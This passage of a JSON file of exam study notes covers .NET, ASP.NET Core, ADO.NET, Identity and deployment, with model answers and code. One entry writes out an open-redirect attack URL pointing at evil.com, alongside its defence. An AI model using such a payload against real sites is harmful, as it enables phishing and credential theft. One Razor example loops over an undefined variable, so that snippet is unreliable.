JIT arrow. Keep each hosting model to one line so all four fit.","skel":["Framework vs Core vs Mono in a line each","Source → Roslyn → MSIL + metadata → assembly","CLR loads, verifies, JITs to native","CLI = CTS + CLS + VES","Kestrel, IIS in/out of process, Nginx, Docker"],"ans":"• .NET Framework — the original Windows-only implementation (to 4.8), installed with Windows, hosting Web Forms, WCF and WPF.\n• .NET Core / .NET 5+ — open-source, cross-platform, modular NuGet packages, side-by-side versions, much faster; the current line.\n• Mono — a third-party reimplementation of .NET Framework for Linux, Android and iOS, which made Xamarin possible; largely superseded by .NET 6+.\nCompilation and execution:\nC# source → Roslyn compiler → MSIL (CIL) plus metadata packed into an assembly (.dll) → at run time the CLR loads it, verifies type safety, JIT-compiles MSIL to native code and executes it. CLI is the umbrella standard: CTS (one type system), CLS (common language subset), VES (execution engine). MSIL is CPU-independent, so one DLL runs anywhere a CLR exists.\nHosting models:\n• Kestrel — the built-in cross-platform server; fast, async, handles HTTPS itself, usually behind a proxy.\n• IIS — in-process (ANCM loads the app inside w3wp, no proxy hop, fastest on Windows) or out-of-process (IIS reverse-proxies to Kestrel and ANCM manages the process).\n• Nginx — Linux reverse proxy: TLS termination, static files, load balancing, then Kestrel.\n• Docker — app plus runtime in an image, run by the container runtime and scaled by Kubernetes."},"ncc-16":{"u":1,"logic":"Tests whether you can define this[...] and separate it from an ordinary property by signature, not by purpose. Students often say indexers are only for arrays.","how":"One short class, one usage line, then five contrast bullets with the named-property case first. The overload point is the differentiator.","skel":["Indexer uses this[...] with parameters","Short Team class with get and set","Usage line t[0] = \"Ram\"","Property is named and takes no parameter","Indexers overload by parameter type, cannot be static"],"ans":"An indexer is a member that lets an object be indexed like an array, written with the this[...] syntax.\npublic class Team {\n  private string[] _m = new string[10];\n  public string this[int i] {\n    get => _m[i];\n    set => _m[i] = value;\n  }\n}\nvar t = new Team();\nt[0] = \"Ram\";\nConsole.WriteLine(t[0]);   // Ram\nDifferences from a property:\n• A property has a name (obj.Name); an indexer has none — it is always this[...] and is invoked with arguments.\n• An indexer takes parameters (int, string, or several); a property takes none.\n• Indexers can be overloaded by parameter type (this[int], this[string]) and accept multiple parameters (this[int row, int col]); a class has one property per name.\n• Both use get/set accessors, may be virtual or abstract, and can expose different access levels for get and set.\n• An indexer cannot be static; a property can.\nIndexers suit collection-like types: List<T> exposes T this[int index], Dictionary uses this[TKey]."},"ncc-17":{"u":1,"logic":"A near-repeat of the async part of question 1, so it rewards the same knowledge under time pressure. Examiners look for the state machine and the thread-pool argument.","how":"This repeats question 1 — a sure shot. Reuse the same six-line method, then give the thread-pool reason in two sentences and three rules.","skel":["async marks the method; await suspends it","Six-line ReadAllTextAsync example","Compiler builds a state machine, thread returns","Web apps: free threads mean more requests","Avoid .Result, async void, add WhenAll"],"ans":"async marks a method that may suspend; await releases the current thread until the awaited Task completes, then resumes the method.\npublic async Task<int> CountAsync() {\n  string s = await File.ReadAllTextAsync(\"f.txt\");\n  return s.Length;\n}\nWhat happens: the compiler builds a state machine. At the await the incomplete Task is returned to the caller and the thread goes back to the pool, so nothing blocks; when the I/O finishes, a pool thread continues after the await.\nWhy it matters in web applications: ASP.NET Core serves requests from a bounded thread pool. Blocking a thread on a database, file or HTTP call wastes it, and enough blocking calls exhaust the pool. Async frees the thread to serve other users, so throughput rises without adding hardware — the standard case being a page that queries the database.\nRules: async all the way up, no async void except event handlers, suffix methods Async, use Task.WhenAll for parallel calls, and never call .Result or .Wait() (deadlock risk)."},"ncc-18":{"u":3,"logic":"Tests the middleware pipeline order and the real differences from System.Web. Vague answers such as \"Core is newer and faster\" earn little.","how":"Draw the pipeline arrow first (browser → Kestrel → middleware → routing → controller), then six contrast bullets. Order of middleware is a marked point.","skel":["Draw Kestrel → middleware → routing → controller","Pipeline built explicitly in Program.cs","Core: cross-platform, self-hosted, NuGet","Framework: Windows, IIS, System.Web","Async-first, unified MVC plus API"],"ans":"ASP.NET Core is a modular, cross-platform request pipeline.\nArchitecture: browser → Kestrel (web server) → middleware in a fixed order (exception handler, HSTS, HTTPS redirection, static files, routing, authentication, authorization, endpoints) → endpoint or controller → response. Program.cs wires the host, the DI container and this pipeline; anything not registered is simply absent.\nDifferences from ASP.NET Framework:\n• Platform — Core runs on Windows, Linux and macOS; Framework is Windows and IIS only.\n• Hosting — Core is self-hosted on Kestrel (IIS or Nginx optional); Framework needs IIS and System.Web at its centre.\n• Request handling — Core uses explicit ordered middleware; Framework used HttpModules, HttpHandlers and a hidden integrated pipeline.\n• Packaging — Core is NuGet packages with side-by-side versions; Framework is one monolithic install in the GAC.\n• Configuration — appsettings.json with DI-bound options versus web.config.\n• Scope — Core unifies MVC, Web API, Razor Pages, SignalR and gRPC on one stack, is async-first and far faster."},"ncc-19":{"u":4,"logic":"Tests the two halves that always travel together: how values reach the action, and how the server refuses bad ones. Saying \"data annotations validate\" without ModelState is incomplete.","how":"Define binding with its five sources, then one model with three attributes, then the ModelState.IsValid guard. The guard line is the marked part.","skel":["Binding fills parameters from the request","Sources: route, query, form, body, headers","Model with Required, Range, EmailAddress","Check ModelState.IsValid before saving","Return the view to show errors"],"ans":"Model binding is how ASP.NET Core fills action parameters from the request automatically, converting strings to the parameter type and recording failures in ModelState. Sources, chosen by name or attribute: route values, query string, form fields, JSON body ([FromBody]), headers and uploaded files. Complex types bind from the body in an API and from form fields in MVC.\nServer-side validation uses data annotations on the model:\npublic class Student {\n  [Required(ErrorMessage = \"Name is required\")]\n  public string Name { get; set; }\n  [Range(1, 120, ErrorMessage = \"Age 1-120\")]\n  public int Age { get; set; }\n  [EmailAddress] public string Email { get; set; }\n}\npublic IActionResult Create(Student s) {\n  if (!ModelState.IsValid) return View(s);   // redisplay with errors\n  _db.Students.Add(s); _db.SaveChanges();\n  return RedirectToAction(\"Index\");\n}\n<span asp-validation-for=\"Name\" class=\"text-danger\"></span> prints each message. Because binding and validation run before the action, a bad request never reaches the database; client-side jQuery validation is only a convenience."},"ncc-20":{"u":5,"logic":"Tests the connected versus disconnected model of ADO.NET. Listing four class names without saying who opens the connection earns half marks at best.","how":"One role line per class, then a five-step flow for connected mode and one line for disconnected. Name ExecuteNonQuery/Scalar/Reader.","skel":["Connection opens the session","Command carries SQL and parameters","Reader is forward-only and connected","Adapter fills a DataSet, disconnected","Flow: open, execute, loop, dispose"],"ans":"ADO.NET works in two modes: connected (Reader) and disconnected (Adapter plus DataSet).\n• Connection (SqlConnection) — opens a session to the database using a connection string; it holds the network socket, so it must be closed and is wrapped in using.\n• Command (SqlCommand) — carries SQL text or a stored procedure plus parameters. ExecuteNonQuery returns rows affected for INSERT/UPDATE/DELETE, ExecuteScalar returns one value, ExecuteReader returns rows.\n• Reader (SqlDataReader) — a fast, forward-only, read-only cursor over the result while the connection stays open; r.Read() moves one row.\n• Adapter (SqlDataAdapter) — a bridge between a DataSet/DataTable and the database: Fill() loads rows and closes the connection itself, Update() writes changes back.\nThey work together in this order: create the Connection, create a Command with SQL and parameters, Open, ExecuteReader, loop with r.Read() mapping columns to objects, then dispose in reverse order via using. For offline work the Adapter fills a DataSet so the UI can browse after the connection closes."},"ncc-21":{"u":6,"logic":"Tests the lifetime of each store, especially that TempData survives one redirect and is then gone. Many answers wrongly call ViewData a cross-request store.","how":"One-line definition with the read-once behaviour, then four contrast bullets on scope, storage, type and use. End with the PRG example.","skel":["TempData: survives one redirect, read once","ViewData: one request, controller to view","Session: whole user session","Storage: cookie or session vs memory","Use TempData for PRG success messages"],"ans":"TempData is a short-lived dictionary that survives exactly one redirect and is cleared when read: TempData[\"msg\"] = \"Saved\"; then var m = TempData[\"msg\"]; Peek() reads without consuming and Keep() retains it.\nDifferences:\n• Scope — TempData: current and next request (one redirect). ViewData/ViewBag: the current request only, controller to view. Session: the whole user session until timeout.\n• Storage — TempData: a cookie by default (encrypted, about 4KB) or session if configured. ViewData: an in-memory dictionary. Session: server memory, a distributed cache or SQL, keyed by a cookie.\n• Type safety — ViewData needs casting, ViewBag is dynamic (no compile check), TempData holds object, Session stores byte[] with string helpers.\n• Survives redirect — only TempData and Session.\nUse TempData when you post a form and then redirect to a list page and want to show \"Record saved\" once (Post-Redirect-Get), or to pass a one-time error. Use Session for a cart or login identity reused across many requests, and ViewData when only the view needs the current page's title."},"ncc-22":{"u":6,"logic":"Checks that you can name the cache API and argue the benefit in latency and load, plus the cost of staleness. \"Caching makes it fast\" is not enough.","how":"Register, GetOrCreate with expiry, remove-on-change — three code lines. Then four benefits and one line on invalidation. Keep it operational.","skel":["AddMemoryCache in Program.cs","GetOrCreate with absolute expiry","Remove the key when data changes","Benefits: latency, DB load, throughput","Cost: stale data, so plan invalidation"],"ans":"Caching stores the result of expensive work in memory, shared by all users — IMemoryCache in-process, or a distributed cache such as Redis or SQL when there are several servers.\nHow it is used:\nbuilder.Services.AddMemoryCache();\nvar books = _cache.GetOrCreate(\"books\", e => {\n  e.AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(10);\n  return _db.Books.AsNoTracking().ToList();\n});\n_cache.Remove(\"books\");          // after an insert or update\nExpiry can be absolute, sliding (reset on each hit) or both; priorities let the runtime evict entries under memory pressure. Whole responses can be cached with [ResponseCache(Duration = 60)].\nBenefits:\n• Lower latency — memory is microseconds against milliseconds for a database query.\n• Less load on the database, so the same server serves more concurrent users.\n• Absorbs traffic spikes and keeps response times stable.\n• Lower cloud cost, since fewer read replicas and IOPS are needed.\nThe cost is staleness, so keys must be invalidated on write, and per-user secrets must never enter a shared cache."},"ncc-23":{"u":7,"logic":"Tests judgement between two SPA options for an ASP.NET Core API. Answers that list features without advantages/disadvantages and a recommendation lose marks.","how":"Two columns in your head: framework versus library, then pros and cons each, then one recommendation line. Bulk of marks is in the trade-off.","skel":["Both call the same Web API for JSON","Angular: full framework, TypeScript, RxJS, DI","React: library, JSX, hooks, virtual DOM","Pros and cons for each","Choose by team size and structure"],"ans":"Both build SPAs that call an ASP.NET Core Web API returning JSON; they differ in scope and model.\n• Angular — a full framework from Google: TypeScript, components and modules, built-in DI and routing, HttpClient with RxJS observables, two-way binding and an opinionated CLI. Advantages: everything included, consistent structure for large teams, strong typing and testability. Disadvantages: steep learning curve, heavier bundle, more ceremony and version churn.\n• React — a library from Meta: JSX, function components and hooks, one-way data flow, a virtual DOM, with routing and state from third parties (React Router, Redux). Advantages: small learning curve, huge ecosystem, flexible, very fast rendering, largest talent pool. Disadvantages: too many choices, frequent ecosystem change, JSX mixes markup into JavaScript.\nChoose Angular for a large enterprise team that wants conventions enforced; choose React for flexibility and hiring. Either is served from wwwroot or a separate dev server with a proxy, and both authenticate with a JWT or cookie against the same API."},"ncc-24":{"u":8,"logic":"Tests whether you can wire authentication end to end: packages, services, middleware order, schema and sign-in call. Forgetting UseAuthentication before UseAuthorization is the classic error.","how":"Numbered steps 1-5: register DbContext and Identity, add the two middleware calls in order, run migrations, then scaffold login. Order is a marked point.","skel":["Identity = users, roles, claims, hashed passwords","AddIdentity with EF stores and token providers","UseAuthentication before UseAuthorization","Migrations create the AspNetUsers tables","SignInManager for login, [Authorize] to protect"],"ans":"ASP.NET Core Identity is the membership system: users, PBKDF2-hashed passwords, roles, claims, tokens, two-factor authentication, lockout and e-mail confirmation, stored in EF Core tables (AspNetUsers, AspNetRoles, AspNetUserRoles).\nAdding authentication:\n1. Add packages Microsoft.AspNetCore.Identity.EntityFrameworkCore and Microsoft.AspNetCore.Identity.UI.\n2. Register the services:\nbuilder.Services.AddDbContext<AppDbContext>(o => o.UseSqlServer(cs));\nbuilder.Services.AddIdentity<IdentityUser, IdentityRole>()\n       .AddEntityFrameworkStores<AppDbContext>()\n       .AddDefaultTokenProviders();\n3. Add middleware in this order, before endpoints:\napp.UseAuthentication();   // who you are — must come first\napp.UseAuthorization();    // what you may do\n4. Create the schema: dotnet ef migrations add Identity; dotnet ef database update.\n5. Scaffold or write Register/Login using UserManager.CreateAsync and SignInManager.PasswordSignInAsync, then protect pages with [Authorize] and [AllowAnonymous] on the login actions.\nOptions control password rules, lockout and cookie expiry."},"ncc-25":{"u":9,"logic":"Tests the IIS-to-Kestrel bridge and the in-process versus out-of-process distinction. Students often think IIS runs the DLL directly.","how":"Define ANCM as a native IIS module, show the web.config snippet, then two bullets for in-process and out-of-process. The Hosting Bundle is a marked detail.","skel":["ANCM is a native IIS module, not managed","web.config points processPath at dotnet","Out-of-process: proxy to Kestrel on loopback","In-process: CoreCLR inside w3wp, default","Process management and Hosting Bundle"],"ans":"The ASP.NET Core Module (ANCM) is a native IIS module that lets IIS host ASP.NET Core apps, which are console programs with their own Kestrel server rather than IIS-managed DLLs.\nHow it works:\n• The deployed web.config declares the module: <add name=\"aspNetCore\" path=\"*\" verb=\"*\" modules=\"AspNetCoreModuleV2\" /> and sets processPath=\"dotnet\" arguments=\"MyApp.dll\".\n• Out-of-process: ANCM starts the app as a child process on a random loopback port and reverse-proxies each IIS request to Kestrel, streaming the response back.\n• In-process (default since 2.2, faster): the CoreCLR runs inside the IIS worker process (w3wp), so requests never leave the process and one proxy hop is saved.\n• ANCM also manages the process — starting it on the first request, restarting after a crash, and shutting it down when the app pool stops or recycles.\n• Deployment requires the .NET Hosting Bundle on the server, the app pool set to No Managed Code, and the site's physical path pointing at the published folder."},"ncc-26":{"u":1,"logic":"A choose-two short-note question testing two unrelated topics. Marks are per note, so a half-written third note earns nothing — finish two completely.","how":"Pick the two you can code fastest — hiding/overriding and File I/O — and ignore Azure. Two headings, four lines each, one tiny snippet each.","skel":["Hiding: new keyword, compile-time binding","Overriding: virtual and override, run time","Show the A/B polymorphism line","File: ReadAllText, WriteAllText, StreamWriter","Always dispose with using"],"ans":"(a) Method hiding versus overriding\n• Hiding — a derived method with the same signature marked new. The base method needs no modifier, and the call is bound at compile time by the reference type.\n• Overriding — the base method is virtual or abstract and the derived one uses override. The call is bound at run time by the actual object, giving polymorphism.\nclass A { public virtual void Show() => Console.WriteLine(\"A\"); }\nclass B : A { public override void Show() => Console.WriteLine(\"B\"); }\nA o = new B(); o.Show();   // B, because of override\n(b) File I/O operations in C#\n• One-line calls: File.ReadAllText, File.WriteAllText, File.AppendAllText, File.ReadAllLines.\n• Folder and path work: File.Exists, Copy, Move, Delete, Directory.CreateDirectory, Path.Combine.\n• Streaming: StreamReader/StreamWriter for text line by line, FileStream for bytes.\nusing (var sw = new StreamWriter(\"log.txt\", true)) sw.WriteLine(\"started\");\nstring[] lines = File.ReadAllLines(\"log.txt\");\nusing releases the handle even if an exception is thrown; Path.Combine avoids hand-built paths."},"ncc-27":{"u":1,"logic":"Three unrelated unit-1 topics in one 10-mark question: boxing, attribute argument kinds and custom exceptions. Each part is worth roughly equal marks.","how":"Three headed blocks of equal size. For the program, derive from Exception, throw on a mismatch, catch the specific type. Do not spend more than a third on part one.","skel":["Collection stores object, generics store T","Boxing, casting, compile-time safety","Positional = constructor args; named = properties","Custom exception deriving from Exception","Throw when subject is not C#, catch it"],"ans":"• Collection — a type holding many objects. Non-generic (ArrayList, Hashtable) stores object, so every value type is boxed on insert and cast on read, and a wrong cast fails only at run time. Generic collections (List<T>, Dictionary<K,V>) are checked at compile time, avoid boxing, and are faster and safer.\n• Generics — write the algorithm once with a type parameter: class Box<T> { public T Value; }, with constraints such as where T : class, new().\nAttribute parameters:\n• Positional — constructor arguments in a fixed order: [Range(1, 120)].\n• Named — properties set after them, optional and order-free: [Range(1, 120, ErrorMessage = \"Invalid\")].\nCustom exception:\nclass SubjectException : Exception {\n  public SubjectException(string m) : base(m) { }\n}\nConsole.Write(\"Subject: \");\nstring s = Console.ReadLine();\ntry {\n  if (s != \"C#\") throw new SubjectException(s + \" is not allowed\");\n  Console.WriteLine(\"Welcome\");\n} catch (SubjectException ex) {\n  Console.WriteLine(ex.Message);\n}\nDeriving from Exception keeps stack traces and lets callers catch it specifically."},"ncc-28":{"u":4,"logic":"Tests the create-a-controller reflex and the view-lookup convention. Marks are lost by putting SQL in the view or by not naming the .cshtml path.","how":"Part one: four steps to a controller. Part two: a list scenario with @model and @foreach. Name Views/Student/Index.cshtml explicitly.","skel":["Class ends in Controller, derives from Controller","Public methods are actions returning IActionResult","Convention finds Views/Controller/Action.cshtml","View starts with @model, loops with @foreach","Request → routing → action → Razor → HTML"],"ans":"Creating a controller:\n1. Add a class under Controllers whose name ends in Controller (dotnet new mvc, or Add → Controller → MVC Controller Empty).\n2. Derive it from Controller.\n3. Every public method is an action and returns an IActionResult.\n4. The URL comes from routing: /Student/Details/5 by convention, or [Route(\"students/{id:int}\")].\npublic class StudentController : Controller {\n  public IActionResult Index() => View(_db.Students.ToList());\n  public IActionResult Details(int id) => View(_db.Students.Find(id));\n}\nRendering HTML with Razor — scenario: show a student list.\n• Model: public class Student { public int Id { get; set; } public string Name { get; set; } }\n• The action passes it: return View(students); and convention looks for Views/Student/Index.cshtml.\n• The view declares and uses it:\n@model IEnumerable<Student>\n<ul>\n@foreach (var s in students) { <li>@s.Id — @s.Name</li> }\n</ul>\n• @ encodes output, @{ } runs statements, @if chooses markup, and _Layout supplies the shell through @RenderBody.\nFlow: request → routing → action builds the model → Razor compiles to C# → HTML written to the response."},"ncc-29":{"u":5,"logic":"Tests ORM justification plus raw ADO.NET insert-and-read. The insert loop with parameters is the hard half; a SELECT * without the CSIT filter fails.","how":"Half the page on EF advantages, then one parameterised INSERT loop and one parameterised SELECT. Reuse the same connection object for both.","skel":["EF: no SQL, LINQ, type safe","Change tracking, relationships, migrations","INSERT loop with four parameters","SELECT fee WHERE Course_Name = @n","ExecuteReader then loop r.Read"],"ans":"Advantages of Entity Framework over ADO.NET:\n• No hand-written SQL or manual mapping — entities and DbSet<T> instead.\n• LINQ gives compile-time checking instead of strings.\n• Change tracking with SaveChanges as a unit of work.\n• Relationships through navigation properties, loaded with Include or lazily.\n• Code-First migrations keep the schema in version control.\n• Provider independence: one API for SQL Server, PostgreSQL, SQLite.\n• Parameterised by default, so SQL injection risk drops, and async APIs throughout.\nInsert into FACULTY (ADO.NET):\nusing var con = new SqlConnection(cs); con.Open();\nstring ins = \"INSERT INTO FACULTY(Course_Name,CourseID,No_of_Semester,fee) VALUES(@n,@c,@s,@f)\";\nforeach (var f in list) {\n  using var cmd = new SqlCommand(ins, con);\n  cmd.Parameters.AddWithValue(\"@n\", f.Name);\n  cmd.Parameters.AddWithValue(\"@c\", f.Id);\n  cmd.Parameters.AddWithValue(\"@s\", f.Sem);\n  cmd.Parameters.AddWithValue(\"@f\", f.Fee);\n  cmd.ExecuteNonQuery();\n}\nRetrieve the fee for CSIT:\nusing var q = new SqlCommand(\"SELECT fee FROM FACULTY WHERE Course_Name=@n\", con);\nq.Parameters.AddWithValue(\"@n\", \"CSIT\");\nusing var r = q.ExecuteReader();\nwhile (r.Read()) Console.WriteLine(r[\"fee\"]);"},"ncc-30":{"u":9,"logic":"Tests whether you know deployment is publish plus host plus configuration, not copying files to a server. Environment variables and migrations are the marked details.","how":"Six numbered steps: configure, publish, choose host, HTTPS, migrations, verify. One line each, with the publish command exact.","skel":["Set Production environment, secrets outside files","dotnet publish -c Release -o publish","Choose IIS, Nginx, Azure or Docker","HSTS, HTTPS redirect, Kestrel port","Run migrations, verify health endpoint"],"ans":"1. Prepare configuration: ASPNETCORE_ENVIRONMENT=Production, and connection strings and keys from environment variables, user-secrets or Key Vault — never committed appsettings.\n2. Publish: dotnet publish -c Release -o ./publish. Add -r linux-x64 --self-contained true for a runtime-free build, or /p:PublishSingleFile=true.\n3. Choose the host — IIS (install the Hosting Bundle, create the site, app pool = No Managed Code), Nginx (reverse proxy to Kestrel on port 5000), Azure App Service (zip deploy or GitHub Actions), or Docker (build, push to a registry, run the container).\n4. Configure the endpoint: Kestrel URLs and ports, a TLS certificate, app.UseHsts() and app.UseHttpsRedirection().\n5. Apply database migrations with dotnet ef database update, or a migration bundle at startup, and grant the app pool or container write access for logs and data-protection keys.\n6. Verify: hit /health, check logs, then smoke-test login and one CRUD page.\n7. Keep it running through the IIS app pool, a systemd service or the orchestrator's restart policy."},"ncc-31":{"u":3,"logic":"Tests whether you can explain MVC as a repeatable pattern rather than three definitions. The word \"patterns-based\" is asking for consistency and separation.","how":"One line per layer with its responsibility, then why the pattern repeats, then four benefits. A three-box MVC sketch plus the request arrow is free marks.","skel":["Model holds data and rules","View renders Razor only","Controller handles the request","Routing and binding make it repeatable","Benefits: testability, reuse, parallel work"],"ans":"MVC divides a web application into three roles, applied the same way to every feature.\n• Model — entities, view models and validation rules: data and business logic in one place, reused by every view.\n• View — a Razor .cshtml that only renders; no SQL, no business rules.\n• Controller — receives the request, validates input, calls services, selects the model and view, returns an action result.\nThe pattern makes the site dynamic and consistent: routing maps /Student/Edit/5 to an action, model binding fills its parameters from the request, the action loads current data from the database and the view renders it — so content is generated per request rather than served as fixed files. A new screen means a new action plus a view, not new plumbing.\nBenefits: separation of concerns, each layer unit-testable with a mocked service, views and layouts reused across pages, designers and developers working in parallel, and changes staying local. Draw the three boxes with the request arrow through the controller."},"ncc-32":{"u":6,"logic":"Asks for the definition and then specifically the client-side parts. Students mix in Session and Cache, which are server-side and earn nothing here.","how":"Define state management in one line, then list only client-side techniques with scope and risk. Do not let Session or Cache into this list.","skel":["State management keeps data across stateless requests","Query string: visible, bookmarkable","Hidden field: in the body, still visible in source","Cookie: 4KB, sent every request","localStorage 5-10MB, XSS risk, JS only"],"ans":"State management is the set of techniques used to preserve user and session data across stateless HTTP requests, either on the client or on the server.\nClient-side parts:\n• Query string — ?page=2 appended to the URL; bookmarkable and shareable, but visible, length-limited and logged, so never for secrets.\n• Hidden field — <input type=\"hidden\" name=\"id\" value=\"5\" />; travels in the form body and survives a postback, but is visible in page source.\n• Cookie — a small key/value (about 4KB) stored by the browser and sent with every request to that domain; set HttpOnly, Secure and SameSite for identity cookies.\n• localStorage and sessionStorage — 5 to 10MB, JavaScript only, never sent automatically; localStorage persists after the tab closes while sessionStorage does not, and both are readable by injected script.\n• ViewState — Web Forms only: an encoded hidden field carrying control state.\n• Token or JWT held in memory — SPA identity state.\nChoose by sensitivity: URL for shareable filters, cookie for identity, storage for UI preferences."},"ncc-33":{"u":7,"logic":"Tests writing validation logic, not describing it. The regular expression for exactly ten digits and the single preventDefault are where marks are won.","how":"Markup in three lines, then one submit handler: required check first, phone regex second, one preventDefault at the end. Keep the regex simple.","skel":["Form with username, password, phone","Submit handler starts with a valid flag","Empty check on both text fields","Test phone against ten digits","preventDefault and show one message"],"ans":"<form id=\"f\">\n  <input id=\"uname\" placeholder=\"Username\" />\n  <input id=\"pwd\" type=\"password\" placeholder=\"Password\" />\n  <input id=\"phone\" placeholder=\"Phone\" />\n  <span id=\"msg\"></span>\n  <button>Submit</button>\n</form>\n<script>\n$(\"#f\").on(\"submit\", function (e) {\n  var u = $.trim($(\"#uname\").val());\n  var p = $.trim($(\"#pwd\").val());\n  var ph = $.trim($(\"#phone\").val());\n  var err = \"\";\n  if (u === \"\" || p === \"\") err = \"Username and password are required\";\n  else if (!/^[0-9]{10}$/.test(ph)) err = \"Phone must be exactly 10 digits\";\n  if (err) {\n    e.preventDefault();\n    $(\"#msg\").text(err).css(\"color\", \"red\");\n  }\n});\n</script>\n• $.trim removes stray spaces so a space-only box is still empty.\n• /^[0-9]{10}$/ anchors both ends, so eleven digits or a letter fails.\n• e.preventDefault() stops the POST only when validation fails.\nRepeat the same rules server-side with data annotations and ModelState.IsValid."},"ncc-34":{"u":8,"logic":"Pairs a coarse authorization concept with a server component. It tests whether you know policies exist because roles are too blunt, and what Kestrel actually is.","how":"Two headed halves. Roles versus policies in four contrast lines, then Kestrel in five facts with one configuration line. Do not merge them.","skel":["Role is a string label on the user","Policy is a named rule of requirements","Roles simple; policies composable and testable","Kestrel: default, cross-platform, async","TLS, HTTP/2-3, usually behind a proxy"],"ans":"Roles versus policies (authorization):\n• A role is a coarse label on the user — \"Admin\", \"Student\" — checked with [Authorize(Roles = \"Admin\")]. Cheap, but string-based and hard to combine.\n• A policy is a named rule built from requirements: claims, age, department, time of day or a custom handler. Registered once and applied with [Authorize(Policy = \"MinAge18\")].\nbuilder.Services.AddAuthorization(o => o.AddPolicy(\"AdminOnly\",\n  p => p.RequireRole(\"Admin\").RequireClaim(\"dept\", \"IT\")));\n• Roles answer \"who\", policies answer \"under what condition\", and a policy may use roles internally.\n• Policies are composable, testable and reusable; roles are stored in the user's cookie or token as claims.\nKestrel is the cross-platform, open-source web server built into ASP.NET Core and the default host. It is fully asynchronous, very fast, and supports HTTP/1.1, HTTP/2 and HTTP/3, TLS, WebSockets and limits such as MaxRequestBodySize. It is configured in the \"Kestrel\" section of appsettings, through UseUrls or ConfigureKestrel. On IIS or Nginx it normally sits behind the proxy; it can also face the internet directly with a certificate."},"ncc-35":{"u":4,"logic":"Tests the three service lifetimes and when instances are created and disposed. The captive-dependency trap (Scoped inside Singleton) is the differentiator.","how":"Three lifetimes with one use case each, three registration lines, then the create-resolve-dispose flow. End with DbContext must be Scoped.","skel":["Singleton: one per application lifetime","Scoped: one per HTTP request","Transient: new on every resolve","Register, resolve, inject, dispose","Never inject Scoped into Singleton"],"ans":"The DI container creates, injects and disposes services according to three lifetimes:\n• Singleton — one instance for the whole application, created on first use and shared by every request. For stateless, thread-safe services: IMemoryCache, IConfiguration, logging.\n• Scoped — one instance per HTTP request (per scope), shared by everything resolved in that request. The default for DbContext and repositories.\n• Transient — a new instance every time it is resolved. For lightweight stateless helpers.\nbuilder.Services.AddSingleton<IClock, Clock>();\nbuilder.Services.AddScoped<IStudentService, StudentService>();\nbuilder.Services.AddTransient<IEmailSender, SmtpSender>();\nLife cycle: register in Program.cs → the container validates the graph at startup (ValidateScopes) → on resolve it constructs the object and injects constructor dependencies → Scoped and Transient instances are tracked by the request scope and disposed when the request ends → Singletons are disposed at application shutdown.\nA common error is injecting a Scoped service into a Singleton: it is then captured for the application's life while its DbContext is disposed — the captive dependency."},"ncc-36":{"u":1,"logic":"Tests inheritance, base constructors and virtual dispatch in one small design. Students lose marks for duplicating properties instead of inheriting them.","how":"Write EMPLOYEE first with shared properties plus virtual Salary and Display, then two subclasses using base(...). Show one polymorphic call at the end.","skel":["Employee: Id, Name, Basic, constructor","virtual Salary and Display in the base","Engineer adds Branch, calls base constructor","Doctor adds Speciality, overrides Salary","One Employee reference, two objects"],"ans":"class Employee {                        // super class\n  public int Id { get; set; }\n  public string Name { get; set; }\n  public double Basic { get; set; }\n  public Employee(int id, string n, double b) { Id = id; Name = n; Basic = b; }\n  public virtual double Salary() => Basic;\n  public virtual void Display() =>\n    Console.WriteLine($\"{Id} {Name} Salary = {Salary()}\");\n}\nclass Engineer : Employee {\n  public string Branch { get; set; }\n  public Engineer(int i, string n, double b, string br) : base(i, n, b) => Branch = br;\n  public override double Salary() => Basic + 5000;       // site allowance\n  public override void Display() {\n    base.Display();\n    Console.WriteLine($\"Branch: {Branch}\");\n  }\n}\nclass Doctor : Employee {\n  public string Speciality { get; set; }\n  public Doctor(int i, string n, double b, string sp) : base(i, n, b) => Speciality = sp;\n  public override double Salary() => Basic + 10000;      // hazard allowance\n}\nEmployee e1 = new Engineer(1, \"Ram\", 50000, \"Computer\");\nEmployee e2 = new Doctor(2, \"Sita\", 60000, \"Cardiology\");\ne1.Display(); e2.Display();   // same call, different behaviour\nThe base constructor runs first through base(...), and override gives polymorphism."},"ncc-37":{"u":5,"logic":"Two unrelated topics asked together: what an ORM does, and a redirect vulnerability. The mark on open redirect is for the local-URL check, not a definition.","how":"ORM task in four bullets, then open redirect as attack example plus fix. Write the Url.IsLocalUrl line — it is the single marked fix.","skel":["ORM: map objects to tables, generate SQL","Change tracking, relationships, migrations","Open redirect: unvalidated returnUrl after login","Victim trusts the real domain","Fix with Url.IsLocalUrl or an allowlist"],"ans":"Task of an ORM (Object-Relational Mapper): translate between the object model and relational tables — generate SQL from LINQ, map rows into objects and objects back into rows, track changes, manage keys and identity, resolve relationships and transactions, and supply schema migrations. It removes boilerplate and SQL-injection risk so the developer writes only C#.\nOpen redirect attack: the application takes a destination URL from the request, usually returnUrl after login, and redirects to it without validation — /login?returnUrl=https://evil.com. Because the link and the login page belong to the genuine site, the victim signs in and is then sent to an attacker page that imitates the site and harvests credentials or delivers malware. It also enables OAuth token theft and phishing that bypasses link filters.\nDefence:\n• Validate the target: if (Url.IsLocalUrl(returnUrl)) return Redirect(returnUrl); else return RedirectToAction(\"Index\", \"Home\");\n• Or allowlist known hosts and paths.\n• Prefer RedirectToAction over Redirect with a user-supplied string, and log rejected attempts."},"ncc-38":{"u":1,"logic":"Two short notes that must both be finished. Polymorphism needs the compile-time versus run-time split, and the hidden field needs its insecurity stated.","how":"Two headings, five lines each. For polymorphism give the Shape/Circle call result; for hidden field give the markup plus one security sentence.","skel":["Polymorphism: one interface, many behaviours","Overloading compile time, overriding run time","Shape/Circle example prints 12.56","Hidden field markup and postback use","Not secure: visible in page source"],"ans":"(a) Polymorphism — one interface, many behaviours: the same call executes different code depending on the actual object type.\n• Compile-time (static) — method overloading: same name, different parameter lists; the compiler picks by arguments.\n• Run-time (dynamic) — overriding: the base method is virtual or abstract, the derived uses override, and the CLR dispatches on the real object.\nclass Shape { public virtual double Area() => 0; }\nclass Circle : Shape {\n  public double R = 2;\n  public override double Area() => 3.14 * R * R;\n}\nShape s = new Circle();\nConsole.WriteLine(s.Area());   // 12.56\nIt lets code work against the base type while new subclasses are added without editing it.\n(b) Hidden field — <input type=\"hidden\" name=\"id\" value=\"5\" />. It stores data in the page that the user cannot see but the browser posts back, so the value survives a round trip.\nUses: the record key on an edit form, a concurrency token, a step counter in a wizard, or a flag telling the server which button was pressed.\nIt is not secure — view-source and developer tools show it, and the user can change it — so the server must re-validate and never trust a price or role taken from it."},"ncc-39":{"u":5,"logic":"A 